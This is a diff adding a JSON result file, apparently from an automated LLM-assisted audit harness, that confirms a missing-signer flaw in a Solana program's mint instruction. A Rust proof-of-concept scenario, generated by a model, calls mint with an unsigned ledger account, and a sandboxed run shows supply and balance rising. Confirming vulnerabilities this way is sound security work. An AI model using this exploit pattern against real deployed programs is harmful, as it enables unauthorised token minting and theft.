@@ -1,0 +1,100 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: supply aumentou sem assinatura; balance aumentou sem assinatura",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2425,
+        "completion_tokens": 539,
+        "latency_s": 3.48
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta ledger com dados de 56 bytes (supply em 40..48 e balance em 48..56) e dono do programa. O baseline chama mint com a conta ledger assinando (uso legitimo) e deve ter sucesso. O ataque chama a mesma instrucao mint com os mesmos dados, mas sem a conta ledger assinar. O efeito mede que supply e balance aumentaram mesmo sem assinatura, demonstrando a cunhagem nao autorizada.\",\n  \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet amount: u64 = 25;\\nlet mut ix_data = vec![2u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\nlet metas_signed = vec![AccountMeta::new(ledger_key, true)];\\nlet ix_signed = env.raw_ix(&ix_data, metas_signed);\\nlet contas_signed = vec![(ledger_key, ledger.clone())];\\nlet r_base = env.baseline(\\\"mint legitimo com ledger assinando\\\", &ix_signed, &contas_signed);\\n\\nlet metas_unsigned = vec![AccountMeta::new(ledger_key, false)];\\nlet ix_unsigned = env.raw_ix(&ix_data, metas_unsigned);\\nlet contas_unsigned = vec![(ledger_key, ledger.clone())];\\nlet r = env.attack(\\\"mint sem assinatura da conta ledger\\\", &ix_unsigned, &contas_unsigned);\\n\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &ledger_key).data();\\n    let supply = read_u64(d, 40);\\n    let balance = read_u64(d, 48);\\n    env.effect(\\\"supply aumentou sem assinatura\\\", supply == 125);\\n    env.effect(\\\"balance aumentou sem assinatura\\\", balance == 75);\\n}\"\n}",
+      "plan": "Preparo uma conta ledger com dados de 56 bytes (supply em 40..48 e balance em 48..56) e dono do programa. O baseline chama mint com a conta ledger assinando (uso legitimo) e deve ter sucesso. O ataque chama a mesma instrucao mint com os mesmos dados, mas sem a conta ledger assinar. O efeito mede que supply e balance aumentaram mesmo sem assinatura, demonstrando a cunhagem nao autorizada.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet amount: u64 = 25;\nlet mut ix_data = vec![2u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\n\nlet metas_signed = vec![AccountMeta::new(ledger_key, true)];\nlet ix_signed = env.raw_ix(&ix_data, metas_signed);\nlet contas_signed = vec![(ledger_key, ledger.clone())];\nlet r_base = env.baseline(\"mint legitimo com ledger assinando\", &ix_signed, &contas_signed);\n\nlet metas_unsigned = vec![AccountMeta::new(ledger_key, false)];\nlet ix_unsigned = env.raw_ix(&ix_data, metas_unsigned);\nlet contas_unsigned = vec![(ledger_key, ledger.clone())];\nlet r = env.attack(\"mint sem assinatura da conta ledger\", &ix_unsigned, &contas_unsigned);\n\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &ledger_key).data();\n    let supply = read_u64(d, 40);\n    let balance = read_u64(d, 48);\n    env.effect(\"supply aumentou sem assinatura\", supply == 125);\n    env.effect(\"balance aumentou sem assinatura\", balance == 75);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo com ledger assinando",
+            "result": "Success",
+            "compute_units": 235,
+            "account_flags": "sw",
+            "ix_head": "0219000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "7b8773aba0dd55c0",
+                "post": "000000000000000000000000000000000000000000000000000000000000000000000000000000007d000000000000004b00000000000000"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint sem assinatura da conta ledger",
+            "result": "Success",
+            "compute_units": 235,
+            "account_flags": "-w",
+            "ix_head": "0219000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "7b8773aba0dd55c0",
+                "post": "000000000000000000000000000000000000000000000000000000000000000000000000000000007d000000000000004b00000000000000"
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "supply aumentou sem assinatura",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "balance aumentou sem assinatura",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 235 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 235 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: supply aumentou sem assinatura; balance aumentou sem assinatura"
+    }
+  ],
+  "case_id": "SSP-03-P-S1",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "fn mint(accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    let ledger = &accounts[0];\n\n    let mut data = ledger.try_borrow_mut_data()?;",
+    "explanation": "A instrucao de mint (operacao privilegiada que aumenta supply e balance) nao verifica `ledger.is_signer` nem qualquer outra conta de autoridade. Nao ha `Signer` nem `require!(account.is_signer, ...)`, permitindo que qualquer pessoa cunhe tokens sem autorizacao.",
+    "attack_hypothesis": "Um atacante chamaria a instrucao mint passando uma conta ledger que nao assinou a transacao, aumentando o supply e o balance sem possuir autoridade sobre a conta."
+  }
+}
